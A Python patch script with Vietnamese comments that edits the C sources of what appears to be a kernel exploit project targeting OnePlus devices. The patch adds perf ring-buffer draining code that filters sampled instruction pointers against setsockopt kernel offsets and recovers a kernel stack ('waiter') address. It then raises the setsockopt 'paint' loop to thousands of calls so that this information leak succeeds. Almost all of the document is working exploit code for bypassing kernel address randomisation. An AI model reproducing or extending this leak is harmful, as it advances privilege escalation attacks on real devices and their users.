#!/usr/bin/env python3
"""patch_waiter_leak_rounds.py

Leak `waiter` cần NHIỀU sample: lần đầu chỉ 6 sample (4 lần paint) nên
in_sock=0.  Sửa thành:
  - thêm ssopt_perf_drain(): rút ring (chỉ đọc userspace) và cộng dồn vào bảng
    phiếu nhỏ (mode) với 2 cửa sổ IP;
  - ssopt_perf_result()/ssopt_perf_close();
  - route: nhiều đợt × nhiều lần setsockopt optname-1000 (mỗi lần ~vài µs) rồi
    drain ⇒ kỳ vọng hàng trăm sample rơi đúng cửa sổ.
Lưu ý: rate limit của perf ~80k/s (đã thấy trong log) ⇒ cần ~10-30 ms kernel
time ⇒ ~5000 lần paint là đủ.
"""
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()

old_start = "uint64_t ssopt_perf_end_waiter(void) {"
i = u.index(old_start)
j = u.index("\n}\n", i) + 3
new_fn = """/* --- accumulators across drains (mode over accepted candidates) --- */
static uint64_t wl_cand[16];
static int wl_cnt[16], wl_nc;
static int wl_samples, wl_insock, wl_insys;
static int wl_ring_lost;

void ssopt_perf_drain(void) {
  if (ssopt_perf_fd < 0 || !ssopt_perf_buf) return;
  struct perf_event_mmap_page *hdr = (void *)ssopt_perf_buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  unsigned char *base = ssopt_perf_buf + PAGE_SIZE;
  size_t dsz = ssopt_perf_msz - PAGE_SIZE;
  uint64_t pos = hdr->data_tail;
  int scanned = 0;
  while (pos < head && scanned < 20000) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    scanned++;
    if (ev->type == PERF_RECORD_SAMPLE) {
      wl_samples++;
      unsigned char *p = (unsigned char *)ev + sizeof(*ev);
      uint64_t ip = *(uint64_t *)p; p += 8;
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1) {
        uint64_t sp = ((uint64_t *)p)[31];
        uint64_t w = 0;
        if (ssopt_ip_in(ip, SOCK_SETSOCKOPT_OFF, 0x500)) { w = sp + 0x20; wl_insock++; }
        else if (ssopt_ip_in(ip, SYS_SETSOCKOPT_OFF, 0x100)) { w = sp - 0x160; wl_insys++; }
        if (w) {
          int k = -1;
          for (int t = 0; t < wl_nc; t++) if (wl_cand[t] == w) { k = t; break; }
          if (k >= 0) wl_cnt[k]++;
          else if (wl_nc < 16) { wl_cand[wl_nc] = w; wl_cnt[wl_nc] = 1; wl_nc++; }
        }
      }
    } else if (ev->type == PERF_RECORD_LOST) {
      wl_ring_lost++;
    }
    pos += ev->size;
  }
  hdr->data_tail = pos;
}

uint64_t ssopt_perf_result(void) {
  uint64_t best = 0; int bestn = 0;
  for (int t = 0; t < wl_nc; t++)
    if (wl_cnt[t] > bestn) { bestn = wl_cnt[t]; best = wl_cand[t]; }
  pr_info("waiter leak: samples=%d in_sock=%d in_sys=%d cands=%d best=%016zx "
          "x%d lost=%d\\n",
          wl_samples, wl_insock, wl_insys, wl_nc, (uintptr_t)best, bestn,
          wl_ring_lost);
  return best;
}

void ssopt_perf_close(void) {
  if (ssopt_perf_fd >= 0) {
    ioctl(ssopt_perf_fd, PERF_EVENT_IOC_DISABLE, 0);
    if (ssopt_perf_buf) munmap(ssopt_perf_buf, ssopt_perf_msz);
    close(ssopt_perf_fd);
  }
  ssopt_perf_buf = NULL;
  ssopt_perf_fd = -1;
}
"""
u = u[:i] + new_fn + u[j:]
open(U, "w").write(u)
print("util.c: drain/result/close (+mode table)")

C = "/root/ghostlock/ghostlock-oneplus/src/core/common.h"
c = open(C).read()
old = "uint64_t ssopt_perf_end_waiter(void);"
new = "void ssopt_perf_drain(void);\nuint64_t ssopt_perf_result(void);\nvoid ssopt_perf_close(void);"
assert c.count(old) == 1, ("common", c.count(old))
c = c.replace(old, new, 1)
open(C, "w").write(c)
print("common.h: drain/result/close decls")

F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()
old = """    if (ssopt_perf_begin() == 0) {
      unsigned char dummy[0x60];
      memset(dummy, 0, sizeof dummy);
      for (int i = 0; i < 4; i++)
        setsockopt(sock_paint_fd, SOL_SOCKET, 1000, dummy, sizeof dummy);
      ssopt_leaked_waiter = ssopt_perf_end_waiter();
    }"""
new = """    if (ssopt_perf_begin() == 0) {
      static unsigned char dummy[0x100];
      memset(dummy, 0, sizeof dummy);
      /* perf SW cpu-clock rate is ~80k/s, so we need tens of milliseconds of
       * kernel time: ~5000 cheap optname-1000 paints, draining the ring
       * (userspace-only read) between rounds.  Every accepted sample sits inside
       * one function with a FIXED sp, so all accepted candidates are equal. */
      for (int round = 0; round < 16; round++) {
        for (int i = 0; i < 400; i++)
          setsockopt(sock_paint_fd, SOL_SOCKET, 1000, dummy, 0xfe);
        ssopt_perf_drain();
      }
      ssopt_leaked_waiter = ssopt_perf_result();
      ssopt_perf_close();
    }"""
assert s.count(old) == 1, ("fops rounds", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: 16 rounds x 400 paints + drain")
